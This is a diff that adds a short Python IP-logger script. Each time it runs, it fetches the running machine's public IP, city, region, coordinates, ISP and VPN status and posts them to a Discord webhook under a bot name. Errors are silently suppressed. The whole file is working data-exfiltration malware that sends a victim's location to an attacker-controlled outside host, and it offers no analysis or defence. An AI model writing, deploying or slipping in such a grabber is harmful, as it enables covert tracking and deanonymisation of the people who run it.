@@ -1,0 +1,14 @@
+import requests
+
+webhook = "ur_discord_webhook_here"
+
+def ip():
+  try:
+    api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
+    data = requests.get(api).json()
+    content = f"**logged by ...**: \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**city: {data['city']}**\n**Lat: {data['lat']}**\n**Lon: {data['lon']}**\n**ISP: {data['isp']}**\n**VPN?: {data['proxy']}**"
+    requests.post(webhook, json={"avatar_url":"https://avatars.githubusercontent.com/u/133362230?v=4",'username': 'cerluxbot - Created by: cerlux', 'content': content})
+  except:
+    pass
+
+ip()
